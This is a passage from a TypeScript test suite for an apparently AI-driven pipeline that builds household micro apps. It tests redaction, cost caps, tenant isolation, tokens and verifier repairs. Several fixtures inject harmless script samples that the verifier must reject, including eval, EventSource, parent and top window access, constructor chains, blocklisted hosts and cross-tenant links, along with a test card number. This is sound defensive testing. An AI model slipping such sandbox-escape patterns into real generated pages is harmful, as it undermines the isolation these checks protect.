/** A Workflow step that runs every callback twice (a retry after the work was done but before the result was stored) and keeps the second result. */
function replayingStep(inner: StepLike): StepLike {
  return {
    ...inner,
    async do<T>(name: string, a: any, b?: any): Promise<T> {
      const cb = (typeof a === 'function' ? a : b) as () => Promise<T>;
      await cb();
      return inner.do<T>(name, cb);
    },
  } as StepLike;
}

test('IDEMPOTENT STEPS: every step run twice leaves the same state as once (one debit, one DAG, one model call per stage, one app, one fact)', async () => {
  const run = async (twice: boolean) => {
    const h = await makeHousehold(rt.db);
    await fund(h, 5);
    const rig = goalRig(rt, h);
    await insertGoal(rt, rig);
    const { step, log } = (await import('./helpers/m2')).directStep(undefined, {
      [`goal_approval:${rig.params.goal_id}`]: async () => approve()((await goalRow(rig.params.goal_id))['approval_hash']),
    });
    const outcome = await (await import('../src/goals/goalPipeline')).runGoal(twice ? replayingStep(step) : step, rig.deps, rig.params);
    const id = rig.params.goal_id;
    return {
      outcome: outcome.status,
      steps: log.length,
      calls: rig.model.calls.map((c) => c.sentText.slice(0, 12)),
      ledger: (await ledgerOf(id)).map((e) => e.delta),
      tasks: (await tasks(id)).map((t) => [t.kind, t.status, t.retries]),
      apps: await count('SELECT 1 FROM micro_apps WHERE goal_id = ?', id),
      facts: await count(`SELECT 1 FROM facts WHERE household_id = ? AND predicate = 'hosted_micro_app'`, h.household_id),
      episodes: await count(`SELECT 1 FROM episodes WHERE household_id = ?`, h.household_id),
      status: (await goalRow(id))['status'],
      balance: (await buckets(h)).total,
    };
  };
  const once = await run(false);
  const twice = await run(true);
  assert.equal(once.outcome, 'completed');
  assert.deepEqual(twice.outcome, 'completed');
  assert.deepEqual(twice.ledger, [-5]);
  assert.deepEqual(twice.apps, 1);
  assert.deepEqual(twice.facts, 1);
  assert.deepEqual(twice.calls, once.calls, 'a replayed step never calls a model again');
  assert.deepEqual({ ...twice, steps: 0 }, { ...once, steps: 0 });
});

test('CONTEXT: only redacted names, a spouse on record and the household\'s own facts reach the planner; a quarantined name is left out', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  await rt.db.prepare('UPDATE members SET display_name = ? WHERE household_id = ?').bind('Sam 4111 1111 1111 1111', h.household_id).run();
  await rt.db.prepare(`INSERT INTO members (member_id, household_id, email, role, age_attested_18, display_name) VALUES (?, ?, ?, 'adult', 1, 'Mal password: hunter2')`).bind(`mem_${randomUUID().slice(0, 8)}`, h.household_id, `mal-${randomUUID().slice(0, 6)}@example.org`).run();
  const text = 'Sam is married to Jo.';
  const ep = await fx.userEpisode(h, text);
  const w = await writeFact(rt.db, { household_id: h.household_id, source_episode_id: ep, subject: { type: 'person', name: 'Sam' }, predicate: 'spouse_of', object: { type: 'person', name: 'Jo' }, confidence: 1, quotes: [{ quote: 'married to Jo', char_start: 7, char_end: 20 }] });
  assert.equal(w.status, 'written', JSON.stringify(w));
  await seedPrefs(h);
  const rig = goalRig(rt, h);
  await insertGoal(rt, rig);
  assert.equal((await runToEnd(rig, approve(), rt)).outcome.status, 'completed');
  const planner = rig.model.sent('GOAL-PLANNER')[0]!;
  assert.ok(planner.includes('Household members: Sam [ACCT ****1111]'), planner);
  assert.ok(!planner.includes('4111'), 'no raw card digits');
  assert.ok(!planner.includes('Mal password') && !planner.includes('password'), planner);
  assert.ok(planner.includes('Spouse or partner on record: Jo'));
  assert.ok(planner.includes('Preferred cuisines: Thai') && planner.includes('Dietary restrictions: gluten-free'));
  assert.ok(planner.includes("The member's own site: jos-kitchen.example"));
  assert.ok(rig.model.sent('GOAL-CODE').every((t) => t.includes('Dietary restrictions: gluten-free')), 'the code writer sees them too');
  const ctx = JSON.parse((await fx.one<{ output_json: string }>(`SELECT output_json FROM goal_tasks WHERE goal_id = ? AND kind = 'context_gather'`, rig.params.goal_id)).output_json);
  assert.deepEqual(ctx, { members: ['Sam [ACCT ****1111]'], spouse: 'Jo', cuisines: ['Thai'], restrictions: ['gluten-free'], domain: 'jos-kitchen.example' });
});

test('SLUGS: a second app with the same name in a household gets a numbered slug and both stay reachable', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 10);
  const first = await runGoalCase(h);
  const second = await runGoalCase(h);
  assert.deepEqual([first.outcome.status, second.outcome.status], ['completed', 'completed']);
  assert.deepEqual((await fx.all<{ slug: string }>('SELECT slug FROM micro_apps WHERE household_id = ? ORDER BY created_at, slug', h.household_id)).map((r) => r.slug).sort(), ['recipe-book', 'recipe-book-2']);
  assert.equal((await api(first.rig.env, `/apps/${h.household_id}/recipe-book-2`, h, { fetch: first.rig.deps.fetch })).status, 200);
  assert.equal(JSON.parse((await goalRow(second.id))['result_summary_json']).slug, 'recipe-book-2');
});

test('PLAN FAILED: a planner that does not answer in JSON fails the goal and refunds it; a model outage is a SYSTEM_ERROR, refunded and audited', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const bad = await runGoalCase(h, { script: { plan: 'this is not json' as unknown } });
  assert.deepEqual(bad.outcome, { status: 'failed', code: 'PLAN_FAILED' });
  assert.equal((await buckets(h)).total, 5);

  const h2 = await makeHousehold(rt.db);
  await fund(h2, 5);
  const rig = goalRig(rt, h2);
  rig.deps.fetch = createGuardedFetch({ db: rt.db, fetchImpl: (async () => new Response('down', { status: 500 })) as typeof fetch, ttlMs: 0 });
  rig.deps.gateway = (await import('../src/llm/gateway')).createGateway({ db: rt.db, apiKeys: { openai: 'sk', anthropic: 'ak' }, fetch: rig.deps.fetch, models: { chief: 'gpt-6.2-sol', worker: 'gpt-6-luna' } });
  await insertGoal(rt, rig);
  const run = await runToEnd(rig, approve(), rt);
  assert.deepEqual(run.outcome, { status: 'failed', code: 'SYSTEM_ERROR' });
  assert.deepEqual(run.steps, ['classify_and_debit', 'system_error']);
  assert.deepEqual([(await goalRow(rig.params.goal_id))['status'], (await goalRow(rig.params.goal_id))['error_code']], ['FAILED', 'SYSTEM_ERROR']);
  assert.equal((await buckets(h2)).total, 5, 'refunded');
  assert.equal(await count(`SELECT 1 FROM audit_log WHERE household_id = ? AND action = 'goal_system_error'`, h2.household_id), 1);
});

test('GATE G8 counts the call it is about to make: spend just under the cap plus the next call\'s worst case is stopped, and the cap holds', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h, { script: { usage: { schema: { prompt_tokens: 1000, completion_tokens: 2_472_000 } } } });
  assert.deepEqual(r.outcome, { status: 'failed', code: 'G8_COST' });
  assert.equal(r.rig.model.count('GOAL-CODE'), 0);
  const g = await goalRow(r.id);
  assert.ok(g['cost_usd'] > 1.2434 && g['cost_usd'] < 1.25, `spend ${g['cost_usd']} is under the cap, so only the estimate of the next call can have stopped it`);
});

test('STAGE REGATE: a deliverable that stops passing between verification and staging never reaches R2', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const rig = goalRig(rt, h, {
    smoke: async () => {
      const evil = JSON.stringify({ ...REF(), html: REF().html.replace('</body>', '<script>eval("1")</script></body>') });
      await rt.db.prepare(`UPDATE goal_tasks SET output_json = ? WHERE goal_id = ? AND kind = 'code_gen'`).bind(evil, rig.params.goal_id).run();
      return { ok: true, diagnostics: [], checks: [] };
    },
  });
  await insertGoal(rt, rig);
  const run = await runToEnd(rig, approve(), rt);
  assert.deepEqual(run.outcome, { status: 'failed', code: 'REGATE_FAILED' });
  assert.equal((await rt.bucket.list({ prefix: `apps/${h.household_id}/` })).objects.length, 0);
  assert.deepEqual(await appsOf(rig.params.goal_id), []);
  assert.equal((await buckets(h)).total, 5);
});

// ═══════════════ tightening: the guards the mutation pass found untested ═══════════════

import { PARSE_TOKEN_CAP, INSTALL_TOKEN_TTL_SECONDS, PREVIEW_TOKEN_TTL_SECONDS, MAX_PARSE_TEXT_CHARS } from '../src/builder/microAppRuntime';
import { MAX_QUERY_WORDS, brokenRestrictions, heuristicParse, normalizeParsed, queryWords, restrictionKey, searchTokens, suggestMeals, tagToken, words } from '../src/builder/recipeLogic';
import { canonicalJson } from '../src/missions/runPipeline';
import { sha256Hex } from '../src/crypto/vault';
import { estimateTokens } from '../src/llm/gateway';
import { GMAIL_SCOPE as _GS } from '../src/connectors/gmailSync';

const FORBIDDEN_MORE: Array<[string, string, () => Bundle]> = [
  ['EventSource', 'WEBSOCKET', inject('<script>new EventSource("api/search")</script>')],
  ['static import', 'DYNAMIC_IMPORT', inject('<script type="module">import x from "./a.js";</script>')],
  ['window.open', 'NAVIGATION', inject('<script>window.open("api/search")</script>')],
  ['postMessage', 'NAVIGATION', inject('<script>parent2.postMessage("x", "*")</script>')],
  ['window.top', 'NAVIGATION', inject('<script>var t = window.top;</script>')],
  ['window.parent', 'NAVIGATION', inject('<script>var t = window.parent;</script>')],
  ['constructor chain without a string', 'CONSTRUCTOR_CHAIN', inject('<script>var f = [].constructor.constructor; f(x)</script>')],
  ['constructor( with a string', 'CONSTRUCTOR_CHAIN', inject('<script>var f = constructor("return 1");</script>')],
  ['an upper-case blocked host', 'BLOCKLISTED_ORIGIN', inject('<p>RESY.COM</p>')],
  ['another household path without an id prefix', 'CROSS_TENANT', inject('<a href="/apps/neighbours/recipe-book">x</a>')],
  ['an unlabelled search box', 'A11Y_LABEL', html((h) => h.replace(' aria-label="Search recipes by ingredient, title or tag"', ''))],
  ['a huge page', 'TOO_LARGE', html((h) => h + `<!-- ${'x'.repeat(130_000)} -->`)],
  ['a huge manifest', 'TOO_LARGE', manifest((m) => (m.description = 'x'.repeat(9_000)))],
];
for (const [name, code, make] of FORBIDDEN_MORE) {
  test(`VERIFIER (more) rejects ${name} (${code})`, () => {
    const found = codes(make(), SLUG);
    assert.ok(found.includes(code), `${code} expected, got ${found.join(', ') || 'nothing'}`);
  });
}

test('VERIFIER (more): formatting keeps the location; a plan that is an array or null is not a plan; the apps own household path is allowed', () => {
  assert.match(formatDiagnostics([{ code: 'X', message: 'm', where: 'here' }, { code: 'Y', message: 'n' }]), /^- \[X\] m \(at: here\)\n- \[Y\] n$/);
  assert.equal(verifyPlan([]).ok, false);
  assert.equal(verifyPlan(null).ok, false);
  const own = verifyBundle(inject(`<a href="/apps/${HH}/${SLUG}/preview">preview</a>`)(), { household_id: HH, blocklist: BLOCK, slug: SLUG });
  assert.deepEqual(own.diagnostics, [], 'the app may name its own household path');
});

test('PACKAGER/TOKENS: the iframe allows the camera; token lifetimes are 1 day (preview) and 365 days (install)', async () => {
  const art = buildInstallArtifact({ base_url: 'https://app.example', household_id: HH, slug: SLUG, title: 'T', install_token: 'tok', target_domain: null });
  assert.ok(art.embed_snippet.iframe.includes(' allow="camera" '));
  assert.ok(art.embed_snippet.web_component.includes("setAttribute('allow', 'camera')"));
  assert.equal(PREVIEW_TOKEN_TTL_SECONDS, 86_400);
  assert.equal(INSTALL_TOKEN_TTL_SECONDS, 365 * 86_400);
  assert.equal(PARSE_TOKEN_CAP, 4_000);
  assert.ok(estimateTokens('x'.repeat(MAX_PARSE_TEXT_CHARS)) + 400 < PARSE_TOKEN_CAP, 'the token cap is a backstop the character limit already keeps well inside');
});

test('RECIPE LOGIC: words, folding, caps, restrictions, parsing limits and suggestion order', () => {
  assert.deepEqual(words('a b Crème-Brûlée 7'), ['creme', 'brulee']);
  assert.deepEqual(words('A b'), []);
  assert.equal(queryWords(Array.from({ length: 20 }, (_, i) => `word${i}`).join(' ')).length, MAX_QUERY_WORDS);
  assert.equal(MAX_QUERY_WORDS, 8);
  assert.equal(tagToken('Gluten Free!'), '#gluten-free');
  const many = searchTokens({ title: 'x', ingredients: Array.from({ length: 400 }, (_, i) => `ing${i}`), tags: [] });
  assert.equal(many.trim().split(' ').length, 300);
  assert.deepEqual(brokenRestrictions(['wheat flour'], 'Cake', ['gluten-free', 'vegan']), ['gluten-free']);
  assert.deepEqual(brokenRestrictions(['rice noodles', 'shrimp'], 'Pad Thai', ['gluten-free']), [], 'rice noodles are not gluten');
  assert.deepEqual(brokenRestrictions(['glass noodles'], 'x', ['gluten-free']), []);
  assert.deepEqual(brokenRestrictions(['butter'], 'x', ['Dairy Free', 'nut-free']), ['Dairy Free']);
  assert.equal(restrictionKey(' Gluten Free '), 'gluten-free');
  const ok = { title: 'T', ingredients: ['a'], steps: ['s'], tags: ['Thai', 'thai', 'Soup'], prep_minutes: 20 };
  assert.deepEqual(normalizeParsed(ok), { title: 'T', ingredients: ['a'], steps: ['s'], tags: ['thai', 'soup'], prep_minutes: 20 });
  assert.equal(normalizeParsed({ ...ok, title: '  ' }), null);
  assert.equal(normalizeParsed({ ...ok, ingredients: [], steps: [] }), null);
  assert.notEqual(normalizeParsed({ ...ok, ingredients: [] }), null);
  assert.equal(normalizeParsed({ ...ok, prep_minutes: -5 })!.prep_minutes, 0);
  assert.equal(normalizeParsed({ ...ok, prep_minutes: 99_999 })!.prep_minutes, 1440);
  assert.equal(normalizeParsed({ ...ok, prep_minutes: 'soon' })!.prep_minutes, 0);
  assert.equal(normalizeParsed({ ...ok, ingredients: Array.from({ length: 100 }, (_, i) => `i${i}`) })!.ingredients.length, 60);
  assert.equal(normalizeParsed('x'), null);
  assert.deepEqual(heuristicParse('Soup\nIngredients: a, b\n1. Boil.').ingredients, ['a', 'b']);

  const rec = (id: string, title: string, ingredients: string[], tags: string[]) => ({ record_id: id, title, created_at: `2026-01-0${id.length}`, data: { ingredients, tags } });
  const veg = suggestMeals({ records: [rec('r1', 'Beef stew', ['beef', 'carrots'], [])], cuisines: [], restrictions: ['vegetarian'] });
  assert.ok(veg.every((s) => s.title !== 'Beef stew'), 'a saved recipe that breaks a restriction is never offered');
  const vegan = suggestMeals({ records: [], cuisines: ['thai', 'italian', 'mexican', 'indian'], restrictions: ['vegan'] });
  assert.ok(vegan.length >= 1);
  for (const s of vegan) assert.ok(!/chicken|salmon|eggs|parmesan|mozzarella/.test(s.title.toLowerCase()), s.title);
  const thai = suggestMeals({ records: [], cuisines: ['Thai'], restrictions: [] });
  assert.equal(thai.length, 3);
  assert.ok(thai.every((s) => s.tags.includes('thai')), 'preferred-cuisine ideas outrank the generic ones');
  assert.ok(suggestMeals({ records: [], cuisines: [], restrictions: ['halal'] })[0]!.reason.includes('check it against halal'));
  const saved = suggestMeals({ records: [rec('r1', 'Mum soup', ['leek'], [])], cuisines: ['thai'], restrictions: [] });
  assert.equal(saved[0]!.source, 'saved', 'a saved recipe comes before a bought idea');
});

test('PLAN DAG/SLUG (more): notes are clipped to 400 characters; accents fold', () => {
  const full = ['context_gather', 'schema_gen', 'code_gen', 'verify_bundle', 'smoke_test', 'package_install'].map((kind) => ({ kind, notes: 'n'.repeat(500) }));
  assert.ok(acceptDag('micro_app', full).tasks.every((t) => t.notes.length === 400));
  assert.equal(slugOf('Crème Brûlée Book'), 'creme-brulee-book');
});

test('PIPELINE (more): long titles are clipped, a raw request is redacted again, own-household paths pass, the manifest cap is kept, base urls are normalized', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 30);
  const long = await runGoalCase(h, { script: { plan: { title: 'T'.repeat(200), slug: 'long-title-book', summary: 's'.repeat(700), tasks: [] } } });
  assert.equal(long.outcome.status, 'completed');
  assert.equal((await fx.one<{ t: string }>('SELECT title AS t FROM micro_apps WHERE goal_id = ?', long.id)).t.length, 80);
  assert.equal(JSON.parse((await fx.one<{ o: string }>(`SELECT output_json AS o FROM goal_tasks WHERE goal_id = ? AND kind = 'decompose'`, long.id)).o).summary.length, 600);

  const raw = await runGoalCase(h, { prompt: 'Build me a recipe app for card 4111 1111 1111 1111 holders' });
  assert.equal(raw.outcome.status, 'completed');
  assert.ok(raw.rig.model.calls.length >= 3 && raw.rig.model.calls.every((c) => !c.sentText.includes('4111 1111')), 'the planner and writers see the redacted request even when the row is not');

  const own = await runGoalCase(h, { script: { bundles: [inject(`<a href="/apps/${h.household_id}/recipe-book/preview">preview</a>`)] } });
  assert.equal(own.outcome.status, 'completed', JSON.stringify([own.outcome, await tasks(own.id)]));
  assert.equal(own.rig.model.count('GOAL-REPAIR'), 0, 'the verifier is told this household, so its own path is fine');

  const capped = await runGoalCase(h, { script: { bundles: [manifest((m) => (m.limits = { monthly_ai_calls_cap: 7 }))] } });
  assert.equal(capped.outcome.status, 'completed');
  assert.equal((await fx.one<{ c: number }>('SELECT monthly_ai_calls_cap AS c FROM micro_apps WHERE goal_id = ?', capped.id)).c, 7);

  const rig = goalRig(rt, h);
  rig.params.base_url = `${BASE}/`;
  await insertGoal(rt, rig);
  const slash = await runToEnd(rig, approve(), rt);
  assert.equal(slash.outcome.status, 'completed');
  assert.ok(!((await goalRow(rig.params.goal_id))['preview_url'] as string).includes('//apps'));
  assert.ok(!(slash.outcome as { prod_url: string }).prod_url.includes('//apps'));
});

test('REPAIR (more): the failing deliverable, the slug, a blocked host and a bad plan all reach the checks; repairs are billed as repairs', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 20);
  const marker = await runGoalCase(h, { script: { bundles: [inject('<script>/*MARKER_FAILING_PAGE*/eval("1")</script>'), REF] } });
  assert.equal(marker.outcome.status, 'completed');
  assert.ok(marker.rig.model.sent('GOAL-REPAIR')[0]!.includes('MARKER_FAILING_PAGE'), 'the repair prompt carries the failing deliverable');
  const named = (n: string) => marker.rig.model.calls.filter((c) => JSON.stringify(c.body).includes(n)).length;
  assert.deepEqual([named('goal_plan'), named('goal_schema'), named('goal_code'), named('goal_repair')], [1, 1, 1, 1], 'a repair is requested as a repair');

  const slug = await runGoalCase(h, { script: { bundles: [manifest((m) => (m.slug = 'not-the-slug')), REF] } });
  assert.equal(slug.outcome.status, 'completed');
  assert.ok(slug.rig.model.sent('GOAL-REPAIR')[0]!.includes('SLUG_MISMATCH'));

  const blocked = await runGoalCase(h, { script: { bundles: [inject('<a href="https://resy.com/x">book</a>'), REF] } });
  assert.equal(blocked.outcome.status, 'completed');
  assert.ok(blocked.rig.model.sent('GOAL-REPAIR')[0]!.includes('BLOCKLISTED_ORIGIN'));

  const plan = await runGoalCase(h, { tier: 'research_plan', prompt: RESEARCH_PROMPT, script: { research: { title: 'T', summary: 'S', sections: [{ heading: 'Only', body: 'one' }], next_steps: ['x'] } } });
  assert.deepEqual(plan.outcome, { status: 'failed', code: 'REPAIR_EXHAUSTED' });
  assert.equal((await tasks(plan.id)).find((t) => t.kind === 'verify_bundle')!.status, 'FAILED');
  assert.match((await tasks(plan.id)).find((t) => t.kind === 'verify_bundle')!.error_text ?? '', /\[(PLAN_[A-Z_]+|TOO_FEW_SECTIONS)\]/);

  const exhausted = await runGoalCase(h, { script: { bundles: [bad.eval] } });
  const v = (await tasks(exhausted.id)).find((t) => t.kind === 'verify_bundle')!;
  assert.deepEqual([v.status, v.retries], ['FAILED', 2]);
  assert.match(v.error_text ?? '', /\[EVAL\]/);
});

test('HASHES AND TOKENS: the approval hash covers the goal, bundle and install artifact; the install token is read-only for exactly this app and lasts a year; a halt is cleared before the run', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const rig = goalRig(rt, h);
  await insertGoal(rt, rig);
  const seen: Record<string, unknown> = {};
  const run = await runToEnd(rig, async () => {
    const g = await goalRow(rig.params.goal_id);
    seen['errorCode'] = g['error_code'];
    seen['notified'] = await count(`SELECT 1 FROM audit_log WHERE household_id = ? AND action = 'push_skipped' AND detail_json LIKE '%goal_ready%'`, h.household_id);
    const summary = JSON.parse(g['result_summary_json']);
    seen['hash'] = g['approval_hash'] === (await sha256Hex(canonicalJson({ goal_id: rig.params.goal_id, tier: 'micro_app', bundle_sha256: summary.bundle_sha256, slug: summary.slug, install: JSON.parse(g['install_artifact_json']) })));
    return approve()(g['approval_hash']);
  }, rt);
  assert.equal(run.outcome.status, 'completed');
  assert.deepEqual(seen, { errorCode: null, notified: 1, hash: true });
  const g = await goalRow(rig.params.goal_id);
  const app = await fx.one<{ app_id: string }>('SELECT app_id FROM micro_apps WHERE goal_id = ?', rig.params.goal_id);
  const art = JSON.parse(g['install_artifact_json']);
  const token = decodeURIComponent(/\?t=([^"&\s]+)/.exec(art.embed_snippet.iframe)![1]!);
  const secret = rig.env.SESSION_SECRET;
  assert.deepEqual(await verifyAppToken(secret, token, new Date()), { household_id: h.household_id, app_id: app.app_id, scope: 'install' });
  assert.ok((await verifyAppToken(secret, token, new Date(Date.now() + 364 * 86_400_000))) !== null);
  assert.equal(await verifyAppToken(secret, token, new Date(Date.now() + 366 * 86_400_000)), null);
  const anchor = await fx.one<{ state: string }>('SELECT state FROM mission_runs WHERE run_id = ?', rig.params.goal_id);
  assert.equal(anchor.state, 'CANCELED', 'the ledger anchor is inert');

  // research plan: the hash covers the plan, and the member is told
  await fund(h, 3);
  const r = goalRig(rt, h);
  await insertGoal(rt, r, { tier: 'research_plan', prompt: RESEARCH_PROMPT });
  let rhash = '';
  await runToEnd(r, (hash: string) => ((rhash = hash), approve()(hash)), rt);
  const rg = await goalRow(r.params.goal_id);
  assert.equal(rhash, await sha256Hex(canonicalJson({ goal_id: r.params.goal_id, tier: 'research_plan', plan: JSON.parse(rg['result_summary_json']) })));
  assert.equal(await count(`SELECT 1 FROM audit_log WHERE household_id = ? AND action = 'push_skipped' AND detail_json LIKE '%goal_ready%'`, h.household_id), 2);
});

test('PUBLISH REGATE (more): a bundle that stops passing the verifier after staging is not published even though it is byte for byte what was previewed', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const rig = goalRig(rt, h);
  await insertGoal(rt, rig);
  await rt.db.prepare(`DELETE FROM policy_blocklist WHERE domain = 'recipe-book'`).run();
  try {
    const run = await runToEnd(rig, async () => {
      await rt.db.prepare(`INSERT INTO policy_blocklist (domain, reason) VALUES ('recipe-book', 'test')`).run();
      return approve()((await goalRow(rig.params.goal_id))['approval_hash']);
    }, rt);
    assert.deepEqual(run.outcome, { status: 'failed', code: 'REGATE_FAILED' });
    assert.equal((await buckets(h)).total, 5);
  } finally {
    await rt.db.prepare(`DELETE FROM policy_blocklist WHERE domain = 'recipe-book'`).run();
  }
});

test('PLANNER OUTPUT: a title or note the redactor would change never reaches a page or a later prompt', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h, { script: { plan: { title: 'Cards 4111 1111 1111 1111', slug: 'cards-book', summary: 'pay 4111 1111 1111 1111', tasks: ['context_gather', 'schema_gen', 'code_gen', 'verify_bundle', 'smoke_test', 'package_install'].map((kind) => ({ kind, notes: 'use card 4111 1111 1111 1111' })) } } });
  assert.equal(r.outcome.status, 'completed', JSON.stringify(r.outcome));
  assert.ok(r.rig.model.calls.every((c) => !c.sentText.includes('4111 1111')), 'no later prompt carries it');
  const app = await fx.one<{ title: string; slug: string }>('SELECT title, slug FROM micro_apps WHERE goal_id = ?', r.id);
  assert.deepEqual([app.title, app.slug], ['Household app', 'cards-book']);
  const plan = JSON.parse((await fx.one<{ output_json: string }>(`SELECT output_json FROM goal_tasks WHERE goal_id = ? AND kind = 'decompose'`, r.id)).output_json);
  assert.equal(plan.summary, '');
  assert.ok((await tasks(r.id)).every((t) => !t.error_text));
  assert.ok(!(await fx.one<{ s: string }>(`SELECT group_concat(spec_json) AS s FROM goal_tasks WHERE goal_id = ?`, r.id)).s.includes('4111'));
});

test('PLANNER OUTPUT (more): a planner that answers with the wrong types still gets a safe title, summary and the canonical DAG', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h, { script: { plan: { title: 42, slug: 7, summary: null, tasks: 'later' } } });
  assert.equal(r.outcome.status, 'completed', JSON.stringify(r.outcome));
  const plan = JSON.parse((await fx.one<{ output_json: string }>(`SELECT output_json FROM goal_tasks WHERE goal_id = ? AND kind = 'decompose'`, r.id)).output_json);
  assert.deepEqual([plan.title, plan.summary, plan.dag_source], ['Household app', '', 'canonical']);
});

test('CONTEXT (more): another household\'s spouse is never used', async () => {
  const other = await makeHousehold(rt.db);
  const text = 'Zed is married to Quinn.';
  const ep = await fx.userEpisode(other, text);
  await writeFact(rt.db, { household_id: other.household_id, source_episode_id: ep, subject: { type: 'person', name: 'Zed' }, predicate: 'spouse_of', object: { type: 'person', name: 'Quinn' }, confidence: 1, quotes: [{ quote: 'married to Quinn', char_start: 7, char_end: 23 }] });
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const r = await runGoalCase(h);
  assert.ok(r.rig.model.sent('GOAL-PLANNER')[0]!.includes('Spouse or partner on record: none'));
});

test('API (more): approve and decline send goal_approval events; a halted goal from an opted-in household may retry; unknown goal paths do not reach authentication', async () => {
  const h = await makeHousehold(rt.db);
  await fund(h, 5);
  const rig = goalRig(rt, h);
  await createViaApi(rig, h, WIFE_PROMPT);
  const seenEvent: Record<string, unknown> = {};
  await runToEnd(rig, async () => {
    const row = await goalRow(rig.params.goal_id);
    await api(rig.env, `/api/goals/${rig.params.goal_id}/approve`, h, { body: { approval_hash: row['approval_hash'] } });
    const ev = rig.workflows.goalEvents.at(-1);
    seenEvent['type'] = ev?.type;
    seenEvent['keys'] = Object.keys((ev?.payload ?? {}) as object).sort();
    return ev!.payload;
  }, rt);
  assert.deepEqual(seenEvent, { type: `goal_approval:${rig.params.goal_id}`, keys: ['approval_hash', 'decision', 'member_id'] });

  const optIn = await makeHousehold(rt.db);
  await rt.db.prepare(`UPDATE households SET stripe_customer_id = 'cus_x', stripe_default_payment_method_id = 'pm_x', auto_recharge_enabled = 1, auto_recharge_pack_sku = 'pack_10', auto_recharge_monthly_cap_cents = 2000 WHERE household_id = ?`).bind(optIn.household_id).run();
  const r2 = goalRig(rt, optIn);
  await createViaApi(r2, optIn, WIFE_PROMPT);
  await rt.db.prepare(`UPDATE goals SET status = 'INSUFFICIENT_CREDITS' WHERE goal_id = ?`).bind(r2.params.goal_id).run();
  assert.equal((await api(r2.env, `/api/goals/${r2.params.goal_id}/retry`, optIn, { body: {} })).status, 202, 'auto-recharge may cover it');

  const { env } = (await import('./helpers/m2')).testEnv(rt);
  assert.equal((await handleApi(new Request(`${APP_ORIGIN}/api/goals/goal_zz`), env)).status, 404, 'not a goal path, so not even a 401');
});

test('RUNTIME (more): a missing bundle is a 500, the camera is allowed, quotas and searches are per app, tags match whole, search is capped, expired facts are ignored, the quote is kept', async () => {
  const live = await liveApp();
  const h = live.h;
  const model = makeGoalModel();
  const f = fetchWith(model);
  const parse = (l: Live, text: string, slug = SLUG) => hit(l, { path: `/apps/${l.h.household_id}/${slug}/api/parse-recipe`, bearer: l.h, body: { text }, fetch: f });
  const page = await hit(live, { path: appPath(h), bearer: h });
  assert.equal(page.headers.get('permissions-policy'), 'camera=(self)');

  // a second app in the same household
  await fund(h, 5);
  const second = await runGoalCase(h);
  assert.equal(second.outcome.status, 'completed');
  const slug2 = JSON.parse((await goalRow(second.id))['result_summary_json']).slug as string;
  assert.equal(slug2, 'recipe-book-2');
  const used = async (goal: string) => (await fx.one<{ n: number }>('SELECT monthly_ai_calls_used AS n FROM micro_apps WHERE goal_id = ?', goal)).n;
  const first = await parse(live, 'Soup\nIngredients: leek, potato');
  assert.equal(first.status, 200);
  assert.ok(((await asJson(first))['record'].data.source_quote as string).length > 0, 'the quote is kept');
  assert.deepEqual([await used(live.goal_id), await used(second.id)], [1, 0], 'one app\'s reads do not spend the other\'s');
  const q = async (slug: string, qs: string) => ((await asJson(await hit(live, { path: `/apps/${h.household_id}/${slug}/api/search${qs}`, bearer: h })))['records'] as any[]).length;
  assert.deepEqual([await q(SLUG, '?q=leek'), await q(slug2, '?q=leek'), await q(SLUG, ''), await q(slug2, '')], [1, 0, 1, 0], 'records belong to one app');

  // whole-tag matching
  await parse(live, 'Plain Noodles\nIngredients: noodles');
  const tagged = fetchWith(makeGoalModel({ parse: () => ({ title: 'Tagged', ingredients: ['x1'], steps: ['s'], tags: ['thai'], prep_minutes: 5 }) }));
  await hit(live, { path: appPath(h, '/api/parse-recipe'), bearer: h, body: { text: 'Tagged\nIngredients: x1' }, fetch: tagged });
  assert.equal(await q(SLUG, '?tag=thai'), 1);
  assert.equal(await q(SLUG, '?tag=tha'), 0, 'a tag matches whole, not by prefix');

  // the search cap
  const at = new Date().toISOString();
  const stmts = Array.from({ length: 60 }, (_, i) => rt.db.prepare(`INSERT INTO micro_app_records (record_id, app_id, household_id, collection, title, search_tokens, data_json, created_at) VALUES (?, ?, ?, 'recipes', ?, ' bulkitem ', '{"ingredients":[],"steps":[],"tags":[],"prep_minutes":0,"image_r2_key":null,"source_quote":""}', ?)`).bind(`rec_bulk_${i}_${randomUUID().slice(0, 6)}`, live.app_id, h.household_id, `Bulk ${i}`, at));
  await rt.db.batch(stmts);
  assert.equal(await q(SLUG, '?q=bulkitem'), 50, 'a search returns at most 50');
  assert.equal(await q(SLUG, ''), 50);

  // expired facts are not preferences
  await seedPrefs(h);
  await rt.db.prepare(`UPDATE facts SET valid_from = '2000-01-01T00:00:00Z', valid_to = '2000-01-02T00:00:00Z' WHERE household_id = ? AND predicate = 'prefers_cuisine'`).bind(h.household_id).run();
  const sug = await asJson(await hit(live, { path: appPath(h, '/api/suggest'), bearer: h }));
  assert.deepEqual(sug['used_facts'], { cuisines: [], restrictions: ['gluten-free'] });

  // a missing bundle
  await rt.bucket.delete((await fx.one<{ k: string }>('SELECT bundle_r2_key AS k FROM micro_apps WHERE goal_id = ?', live.goal_id)).k);
  const gone = await hit(live, { path: appPath(h), bearer: h });
  assert.equal(gone.status, 500);
  assert.equal((await asJson(gone))['error'], 'bundle_missing');
});

test('MIGRATION (more): task status and quotas are closed sets', async () => {
  const h = await makeHousehold(rt.db);
  const at = new Date().toISOString();
  await rt.db.prepare(`INSERT INTO goals (goal_id, household_id, prompt_text, tier, status, credits_reserved, max_cost_usd, created_at, updated_at) VALUES ('goal_mig2', ?, 'p', 'micro_app', 'PLANNING', 5, 1.25, ?, ?)`).bind(h.household_id, at, at).run();
